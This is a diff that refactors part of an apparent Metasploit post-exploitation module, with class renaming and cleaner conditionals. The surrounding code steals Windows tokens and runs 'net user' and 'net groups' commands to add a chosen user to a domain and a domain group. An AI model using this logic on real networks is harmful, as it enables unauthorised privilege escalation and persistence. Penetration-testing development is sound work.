@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rex'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::Windows::Priv
 
@@ -223,12 +223,11 @@ class Metasploit3 < Msf::Post
     end
 
     ## steal token if neccessary
-    if (datastore['TOKEN'] == '')
-      token_found,token_user,current_user = token_hunter(domain)
-
-      return if token_found == false
-
-      datastore['TOKEN'] = token_user if current_user == false
+    if datastore['TOKEN'] == ''
+      token_found, token_user, current_user = token_hunter(domain)
+      if token_found && current_user == false
+        datastore['TOKEN'] = token_user
+      end
     end
 
     ## steal token
@@ -247,7 +246,7 @@ class Metasploit3 < Msf::Post
     already_member_group = false
 
     ## Add user to the domain
-    if (datastore['ADDTODOMAIN'] == true)
+    if datastore['ADDTODOMAIN']
       user_add_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain",false)
 
       if (user_add_res =~ /The command completed successfully/ and user_add_res =~ /Domain Users/)
@@ -261,7 +260,7 @@ class Metasploit3 < Msf::Post
     end
 
     ## Add user to a domain group
-    if datastore['ADDTOGROUP'] == true
+    if datastore['ADDTOGROUP']
       ## check if user is already a member of the group
       group_add_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
 
@@ -291,7 +290,7 @@ class Metasploit3 < Msf::Post
     end
 
     ## verify user was added to domain or domain group
-    if datastore['ADDTOGROUP'] == true
+    if datastore['ADDTOGROUP']
       if already_member_group == false
         net_groups_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
 
